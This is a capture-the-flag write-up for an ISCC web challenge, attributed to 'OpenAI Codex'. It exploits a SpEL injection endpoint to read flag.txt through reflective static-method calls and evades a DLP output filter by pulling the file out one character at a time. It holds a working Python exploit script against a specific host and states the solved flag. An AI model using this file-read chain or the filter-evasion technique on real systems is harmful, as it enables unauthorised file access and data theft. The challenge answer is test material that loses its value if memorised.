---
title: "300"
ctf: "ISCC"
date: 2026-05-17
category: web
difficulty: hard
points: 300
flag_format: "ISCC{...}"
author: "OpenAI Codex"
---

# 300

## Summary

题目表面给了一个“签名系统 + 文件名检查”的提示，实际核心是 `/api/route?expr=` 上的 SpEL 执行器。  
直接输出 flag 会被 DLP 拦截，但可以通过 `Method` 函数引用调用静态方法，最终走 `Class.forName -> Paths.get -> Files.readString` 读取 `flag.txt`，再按字符下标逐个取回 flag。

## Solution

### Step 1: 确认 SpEL 能调用静态方法

先通过页面和 `/actuator/info` 确认有一个 SpEL route debugger。  
继续测试发现：

- `''.class.class.methods[2]` 是 `Class.forName(String)`
- `#m = Method对象` 后，可以直接用 `#m(...)` 调用这个静态方法
- `''.class.class.methods[2]('java.nio.file.Paths').methods[0]('/flag')` 能成功得到 `Path`
- `''.class.class.methods[2]('java.nio.file.Files').declaredMethods[61]` 是一参版 `Files.readString(Path)`

所以可构造出完整读取表达式：

```text
{
  #cf=''.class.class.methods[2],
  #pm=#cf('java.nio.file.Paths').methods[0],
  #path=#pm('flag.txt'),
  #m=#cf('java.nio.file.Files').declaredMethods[61],
  #m(#path)
}[4]
```

### Step 2: 绕过 DLP 按字符读取

直接让目标返回完整 flag，会触发：

```text
[DLP System] Warning: Sensitive flag format detected in output stream. Blocked!
```

所以改成：

1. 先取 `readString(...).bytes.length`
2. 再用 `readString(...)[i]` 逐个取字符
3. 拼回完整 flag

完整利用脚本如下：

```python
import requests

BASE = "http://39.105.213.28:12603/api/route"

FOR_NAME = "''.class.class.methods[2]"
PATHS_GET = "#cf('java.nio.file.Paths').methods[0]"
FILES_READ_STRING = "#cf('java.nio.file.Files').declaredMethods[61]"


def eval_expr(expr: str) -> str:
    r = requests.get(BASE, params={"expr": expr}, timeout=20)
    r.raise_for_status()
    return r.text


def build_flag_string_expr() -> str:
    return (
        "{"
        f"#cf={FOR_NAME},"
        f"#pm={PATHS_GET},"
        "#path=#pm('flag.txt'),"
        f"#m={FILES_READ_STRING},"
        "#m(#path)"
        "}[4]"
    )


def main() -> None:
    flag_expr = build_flag_string_expr()
    length = int(eval_expr(flag_expr + ".bytes.length").strip())
    chars = []
    for i in range(length):
        ch = eval_expr(f"{flag_expr}[{i}]")
        if ch == "\\n":
            break
        chars.append(ch)
    print("".join(chars))


if __name__ == "__main__":
    main()
```

运行后输出：

```text
ISCC{SpEL_D0ubl3_Enc0d1ng_Bypass_202605}
```

## Flag

```text
ISCC{SpEL_D0ubl3_Enc0d1ng_Bypass_202605}
```
